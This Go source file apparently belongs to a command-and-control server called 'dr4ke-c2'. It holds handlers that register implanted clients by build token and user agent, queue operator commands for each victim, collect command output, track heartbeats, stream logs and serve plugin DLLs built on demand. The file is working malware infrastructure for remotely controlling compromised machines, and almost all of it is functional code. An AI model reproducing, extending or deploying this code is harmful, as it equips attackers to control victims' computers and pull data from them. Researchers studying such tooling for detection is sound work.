package controllers

import (
	"bufio"
	"dr4ke-c2/server/database"
	"dr4ke-c2/server/models"
	"dr4ke-c2/server/utils"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type CommandResult struct {
	ClientID  string    `json:"client_id"`
	Output    string    `json:"output"`
	Timestamp time.Time `json:"timestamp"`
	ID        string    `json:"id"`
}

type LogEntry struct {
	Timestamp time.Time `json:"timestamp"`
	Level     string    `json:"level"`
	Message   string    `json:"message"`
}

var recentResults = make([]CommandResult, 0)
var resultsMutex sync.RWMutex

var logClients = make(map[string]chan LogEntry)
var logClientsMutex sync.RWMutex
var serverLogs = make([]LogEntry, 0, 1000)
var serverLogsMutex sync.RWMutex

func AddServerLog(level, message string) {
	entry := LogEntry{
		Timestamp: time.Now(),
		Level:     level,
		Message:   message,
	}

	serverLogsMutex.Lock()
	if len(serverLogs) >= 1000 {
		serverLogs = serverLogs[1:]
	}
	serverLogs = append(serverLogs, entry)
	serverLogsMutex.Unlock()

	logClientsMutex.RLock()
	for _, ch := range logClients {
		select {
		case ch <- entry:
		default:
		}
	}
	logClientsMutex.RUnlock()
}

func (c *ClientController) GetResultsHandler(w http.ResponseWriter, r *http.Request) {
	resultsMutex.RLock()
	defer resultsMutex.RUnlock()

	utils.RespondWithJSON(w, http.StatusOK, map[string]interface{}{
		"results": recentResults,
	})
}

type ClientController struct {
	store          database.Store
	batchProcessor *database.BatchProcessor
}

func NewClientController(store database.Store) *ClientController {
	batchProcessor := database.NewBatchProcessor(store, 1*time.Second, 100, nil)
	return &ClientController{
		store:          store,
		batchProcessor: batchProcessor,
	}
}

func (c *ClientController) RegisterHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	buildID := r.Header.Get("X-Build-ID")
	userAgent := r.Header.Get("User-Agent")

	fmt.Printf("[DEBUG] Registration attempt - ID: %s\n", clientID)
	fmt.Printf("[DEBUG] User-Agent received: %s\n", userAgent)

	if clientID == "" || buildID == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID and Build ID are required")
		return
	}

	token := r.Header.Get("Authorization")
	if token == "" {
		utils.RespondWithError(w, http.StatusUnauthorized, "Authorization token required")
		return
	}
	token = strings.TrimPrefix(token, "Bearer ")
	data, err := os.ReadFile("auth-token.json")
	if err != nil {
		utils.LogOutput("[ERROR] Failed to read auth-token.json: %v", err)
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to validate token")
		return
	}

	var tokenStore models.TokenStore
	if err := json.Unmarshal(data, &tokenStore); err != nil {
		utils.LogOutput("[ERROR] Failed to parse auth-token.json: %v", err)
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to validate token")
		return
	}
	var validToken bool
	for _, entry := range tokenStore.Tokens {
		if entry.BuildID == buildID && entry.Token == token && entry.IsActive {
			validToken = true
			break
		}
	}

	if !validToken {
		utils.LogOutput("[ERROR] Invalid token for build ID %s", buildID)
		utils.RespondWithError(w, http.StatusUnauthorized, "Invalid token")
		return
	}
	expectedPrefix := fmt.Sprintf("Dr4ke-Client/%s (", buildID)
	if !strings.HasPrefix(userAgent, expectedPrefix) {
		utils.LogOutput("[ERROR] Invalid User-Agent: %s", userAgent)
		utils.RespondWithError(w, http.StatusUnauthorized, "Invalid User-Agent")
		return
	}
	ipAddress := r.RemoteAddr
	if forwardedFor := r.Header.Get("X-Forwarded-For"); forwardedFor != "" {
		ipAddress = forwardedFor
	}

	parts := strings.Split(userAgent, "(")
	if len(parts) != 2 {
		fmt.Printf("[DEBUG] Invalid User-Agent format - parts: %v\n", parts)
		utils.RespondWithError(w, http.StatusBadRequest, "Invalid User-Agent format")
		return
	}

	infoParts := strings.Split(strings.TrimRight(parts[1], ")"), "; ")
	fmt.Printf("[DEBUG] Info parts: %v (count: %d)\n", infoParts, len(infoParts))

	if len(infoParts) < 2 {
		fmt.Printf("[DEBUG] Invalid info parts - expected at least 2, got %d\n", len(infoParts))
		utils.RespondWithError(w, http.StatusBadRequest, "Invalid User-Agent format")
		return
	}

	var processName string
	if len(infoParts) >= 3 {
		processName = infoParts[2]
		fmt.Printf("[DEBUG] Process name extracted: %s\n", processName)
	} else {
		processName = "unknown"
		fmt.Printf("[DEBUG] Process name not available, using default: %s\n", processName)
	}

	client := &models.Client{
		ID:         clientID,
		IPAddress:  ipAddress,
		UserAgent:  userAgent,
		FirstSeen:  time.Now(),
		LastSeen:   time.Now(),
		Status:     "Active",
		State:      models.StateActive,
		TaskQueue:  make([]models.Task, 0),
		TasksMutex: sync.RWMutex{},
		Info: models.ClientInfo{
			OS:           infoParts[0],
			Architecture: infoParts[1],
			ProcessName:  processName,
		},
	}

	fmt.Printf("[DEBUG] Client created with ProcessName: %s\n", client.Info.ProcessName)

	existingClient, err := c.store.GetClient(clientID)
	if err == nil {
		client.FirstSeen = existingClient.FirstSeen
		if err := c.store.UpdateClient(client); err != nil {
			utils.LogOutput("[ERROR] Failed to update client %s: %v", clientID, err)
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to update client")
			return
		}
	} else {
		if err := c.store.AddClient(client); err != nil {
			if err == database.ErrClientExists {
				if err := c.store.UpdateClient(client); err != nil {
					utils.LogOutput("[ERROR] Failed to update client %s after race condition: %v", clientID, err)
					utils.RespondWithError(w, http.StatusInternalServerError, "Failed to register client")
					return
				}
			} else {
				utils.LogOutput("[ERROR] Failed to add client %s: %v", clientID, err)
				utils.RespondWithError(w, http.StatusInternalServerError, "Failed to register client")
				return
			}
		}
	}

	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Client registered"})
}

func (c *ClientController) TasksHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID is required")
		return
	}
	client, err := c.store.GetClient(clientID)
	if err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get client")
		}
		return
	}
	client.LastSeen = time.Now()
	client.UpdateStatus()
	c.batchProcessor.UpdateClient(client.ID, client)
	tasks, err := c.store.GetTasks(clientID)
	if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get tasks")
		return
	}
	if len(tasks) == 0 {
		utils.RespondWithJSON(w, http.StatusOK, []string{})
		return
	}
	for _, task := range tasks {
		update := map[string]interface{}{
			"taskID":    task.ID,
			"status":    "processing",
			"result":    "",
			"timestamp": time.Now(),
		}
		c.batchProcessor.AddTaskUpdate(clientID, update)
	}
	if err := c.store.ClearTasks(clientID); err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to clear tasks")
		return
	}
	taskObjects := make([]map[string]interface{}, len(tasks))
	for i, task := range tasks {
		taskObjects[i] = map[string]interface{}{
			"command":     task.Command,
			"isEncrypted": task.IsEncrypted,
		}
	}
	utils.RespondWithJSON(w, http.StatusOK, taskObjects)
}
func (c *ClientController) SubmitHandler(w http.ResponseWriter, r *http.Request) {
	var data struct {
		ID     string `json:"id"`
		TaskID string `json:"taskId"`
		Output string `json:"output"`
		Status string `json:"status"`
	}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		utils.RespondWithError(w, http.StatusBadRequest, "Invalid request body")
		return
	}
	client, err := c.store.GetClient(data.ID)
	if err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get client")
		}
		return
	}
	client.LastSeen = time.Now()
	client.UpdateStatus()
	c.batchProcessor.UpdateClient(client.ID, client)
	if data.TaskID != "" {
		status := data.Status
		if status == "" {
			status = "completed"
		}
		update := map[string]interface{}{
			"taskID":    data.TaskID,
			"status":    status,
			"result":    data.Output,
			"timestamp": time.Now(),
		}
		c.batchProcessor.AddTaskUpdate(data.ID, update)
	} else {
		tasks, _ := c.store.GetClientTaskHistory(data.ID)
		for _, taskHistoryItem := range tasks {
			if taskHistory, ok := taskHistoryItem.(database.TaskHistoryEntry); ok {
				lastUpdate := taskHistory.Updates[len(taskHistory.Updates)-1]
				if lastUpdate.Status == "pending" || lastUpdate.Status == "processing" {
					update := map[string]interface{}{
						"taskID":    taskHistory.TaskID,
						"status":    "completed",
						"result":    data.Output,
						"timestamp": time.Now(),
					}
					c.batchProcessor.AddTaskUpdate(data.ID, update)
				}
			}
		}
	}
	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Result submitted"})
}
func (c *ClientController) ClientsHandler(w http.ResponseWriter, r *http.Request) {
	clients, err := c.store.ListClients()
	if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to list clients")
		return
	}
	activeClients := make([]*models.Client, 0)
	for _, client := range clients {
		client.UpdateStatus()
		if client.State != models.StateInactive && client.State != models.StateRemoved {
			activeClients = append(activeClients, client)
		}
	}

	utils.RespondWithJSON(w, http.StatusOK, activeClients)
}
func (c *ClientController) CommandHandler(w http.ResponseWriter, r *http.Request) {
	var commandData struct {
		ID          string `json:"id"`
		Command     string `json:"command"`
		IsEncrypted bool   `json:"isEncrypted"`
	}

	if r.Method == "POST" {
		if err := json.NewDecoder(r.Body).Decode(&commandData); err != nil {
			utils.RespondWithError(w, http.StatusBadRequest, "Invalid request body")
			return
		}
	} else {
		commandData.ID = r.URL.Query().Get("id")
		commandData.Command = r.URL.Query().Get("command")
		commandData.IsEncrypted = r.Header.Get("X-Command-Encrypted") == "true"
	}

	if commandData.ID == "" || commandData.Command == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID and command are required")
		return
	}

	_, err := c.store.GetClient(commandData.ID)
	if err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get client")
		}
		return
	}
	task := models.NewTask(commandData.Command)
	task.IsEncrypted = commandData.IsEncrypted
	if err := c.store.AddTask(commandData.ID, task); err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to send command")
		return
	}

	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Command sent", "taskId": task.ID})
}
func (c *ClientController) DeleteClientHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID is required")
		return
	}
	if err := c.store.DeleteClient(clientID); err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to delete client")
		}
		return
	}
	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Client deleted"})
}
func (c *ClientController) SetBatchProcessor(batchProcessor *database.BatchProcessor) error {
	if batchProcessor == nil {
		return nil
	}
	c.batchProcessor = batchProcessor
	return nil
}
func (c *ClientController) GetBatchProcessor() *database.BatchProcessor {
	return c.batchProcessor
}
func (c *ClientController) HeartbeatHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID is required")
		return
	}
	client, err := c.store.GetClient(clientID)
	if err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get client")
		}
		return
	}

	client.LastSeen = time.Now()
	client.UpdateStatus()

	if err := c.store.UpdateClient(client); err != nil {
		AddServerLog("ERROR", fmt.Sprintf("Failed to update client %s directly: %v", clientID, err))
	}

	c.batchProcessor.UpdateClient(client.ID, client)

	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Heartbeat received"})
}

func (c *ClientController) ResultHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		utils.RespondWithError(w, http.StatusMethodNotAllowed, "Method not allowed")
		return
	}

	var result struct {
		ID        string `json:"id"`
		Output    string `json:"output"`
		Timestamp int64  `json:"timestamp"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		utils.RespondWithError(w, http.StatusBadRequest, "Invalid request body")
		return
	}

	client, err := c.store.GetClient(result.ID)
	if err != nil {
		if err == database.ErrClientNotFound {
			utils.RespondWithError(w, http.StatusNotFound, "Client not found")
		} else {
			utils.RespondWithError(w, http.StatusInternalServerError, "Failed to get client")
		}
		return
	}

	client.LastSeen = time.Now()
	client.UpdateStatus()
	c.batchProcessor.UpdateClient(client.ID, client)

	utils.LogOutput("[RESULT] Client %s sent output (%d characters)", result.ID, len(result.Output))

	lines := strings.Split(result.Output, "\n")
	previewLines := 3
	if len(lines) > previewLines {
		utils.LogOutput("[RESULT] Output preview (first %d lines):\n%s", previewLines, strings.Join(lines[:previewLines], "\n"))
	} else {
		utils.LogOutput("[RESULT] Full output:\n%s", result.Output)
	}

	resultsMutex.Lock()
	recentResults = append(recentResults, CommandResult{
		ClientID:  result.ID,
		Output:    result.Output,
		Timestamp: time.Now(),
		ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
	})

	if len(recentResults) > 100 {
		recentResults = recentResults[1:]
	}
	resultsMutex.Unlock()

	utils.RespondWithJSON(w, http.StatusOK, map[string]string{
		"status":    "Result received",
		"timestamp": fmt.Sprintf("%d", time.Now().Unix()),
	})
}

func (c *ClientController) StreamLogsHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		utils.RespondWithError(w, http.StatusBadRequest, "Client ID is required")
		return
	}

	logChannel := make(chan LogEntry)

	logClientsMutex.Lock()
	logClients[clientID] = logChannel
	logClientsMutex.Unlock()

	defer func() {
		logClientsMutex.Lock()
		delete(logClients, clientID)
		logClientsMutex.Unlock()
	}()

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)

	encoder := json.NewEncoder(w)
	encoder.SetEscapeHTML(false)

	for logEntry := range logChannel {
		if err := encoder.Encode(logEntry); err != nil {
			utils.LogOutput("[ERROR] Failed to send log to client %s: %v", clientID, err)
			return
		}
	}
}

func (c *ClientController) GetServerLogsHandler(w http.ResponseWriter, r *http.Request) {
	serverLogsMutex.RLock()
	defer serverLogsMutex.RUnlock()

	utils.RespondWithJSON(w, http.StatusOK, map[string]interface{}{
		"logs": serverLogs,
	})
}

func (c *ClientController) LogStreamHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Credentials", "true")

	fmt.Fprintf(w, "data: {\"timestamp\":\"%s\",\"level\":\"INFO\",\"message\":\"[STREAM] Event logs stream connected\"}\n\n", time.Now().Format(time.RFC3339))
	if f, ok := w.(http.Flusher); ok {
		f.Flush()
	}

	clientID := fmt.Sprintf("client_%d", time.Now().UnixNano())

	logChannel := make(chan LogEntry, 100)

	logClientsMutex.Lock()
	logClients[clientID] = logChannel
	logClientsMutex.Unlock()

	defer func() {
		logClientsMutex.Lock()
		delete(logClients, clientID)
		logClientsMutex.Unlock()
		close(logChannel)
	}()

	serverLogsMutex.RLock()
	startIdx := 0
	if len(serverLogs) > 50 {
		startIdx = len(serverLogs) - 50
	}
	for i := startIdx; i < len(serverLogs); i++ {
		data, _ := json.Marshal(serverLogs[i])
		fmt.Fprintf(w, "data: %s\n\n", data)
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}
	}
	serverLogsMutex.RUnlock()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case entry, ok := <-logChannel:
			if !ok {
				return
			}
			data, _ := json.Marshal(entry)
			fmt.Fprintf(w, "data: %s\n\n", data)
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
		case <-ticker.C:
			fmt.Fprintf(w, "data: {\"timestamp\":\"%s\",\"level\":\"HEARTBEAT\",\"message\":\"[STREAM] Connection alive\"}\n\n", time.Now().Format(time.RFC3339))
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
		case <-r.Context().Done():
			return
		}
	}
}

func (c *ClientController) LogToFileHandler(w http.ResponseWriter, r *http.Request) {
	file, err := os.OpenFile("server.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		utils.RespondWithError(w, http.StatusInternalServerError, "Failed to open log file")
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	logger := log.New(writer, "", log.LstdFlags)

	oldLogger := log.Default()
	log.SetOutput(io.MultiWriter(writer, os.Stdout))
	defer log.SetOutput(oldLogger.Writer())

	logger.Println("Log file opened")

	utils.RespondWithJSON(w, http.StatusOK, map[string]string{"status": "Logging to file"})
}

func (cc *ClientController) ServePluginHandler(w http.ResponseWriter, r *http.Request) {
	pluginName := strings.TrimPrefix(r.URL.Path, "/plugin/")
	if pluginName == "" {
		http.Error(w, "Plugin name required", http.StatusBadRequest)
		return
	}

	pluginName = strings.TrimSuffix(pluginName, ".dll")

	if !isValidPluginName(pluginName) {
		http.Error(w, "Invalid plugin name", http.StatusBadRequest)
		return
	}

	pluginPath := fmt.Sprintf("plugins/%s/%s.dll", pluginName, pluginName)

	if _, err := os.Stat(pluginPath); os.IsNotExist(err) {
		if err := cc.buildPlugin(pluginName); err != nil {
			log.Printf("Failed to build plugin %s: %v", pluginName, err)
			http.Error(w, "Plugin not found", http.StatusNotFound)
			return
		}
	}

	http.ServeFile(w, r, pluginPath)
	log.Printf("Served plugin: %s", pluginName)
}

func (cc *ClientController) ListPluginsHandler(w http.ResponseWriter, r *http.Request) {
	pluginsDir := "plugins"

	entries, err := os.ReadDir(pluginsDir)
	if err != nil {
		log.Printf("Failed to read plugins directory: %v", err)
		utils.RespondWithJSON(w, http.StatusInternalServerError, map[string]string{"error": "Failed to read plugins directory"})
		return
	}

	var plugins []string
	for _, entry := range entries {
		if entry.IsDir() {
			pluginName := entry.Name()
			manifestPath := fmt.Sprintf("plugins/%s/manifest.json", pluginName)
			if _, err := os.Stat(manifestPath); err == nil {
				plugins = append(plugins, pluginName)
			}
		}
	}

	utils.RespondWithJSON(w, http.StatusOK, plugins)
}

func isValidPluginName(name string) bool {
	for _, char := range name {
		if !((char >= 'a' && char <= 'z') || (char >= 'A' && char <= 'Z') ||
			(char >= '0' && char <= '9') || char == '_') {
			return false
		}
	}
	return len(name) > 0
}

func (cc *ClientController) buildPlugin(pluginName string) error {
	pluginDir := fmt.Sprintf("plugins/%s", pluginName)

	buildScript := fmt.Sprintf("%s/build.bat", pluginDir)
	if _, err := os.Stat(buildScript); os.IsNotExist(err) {
		return fmt.Errorf("build script not found for plugin %s", pluginName)
	}

	cmd := exec.Command("cmd", "/c", buildScript)
	cmd.Dir = pluginDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("build failed: %v, output: %s", err, string(output))
	}

	log.Printf("Plugin %s built successfully", pluginName)
	return nil
}
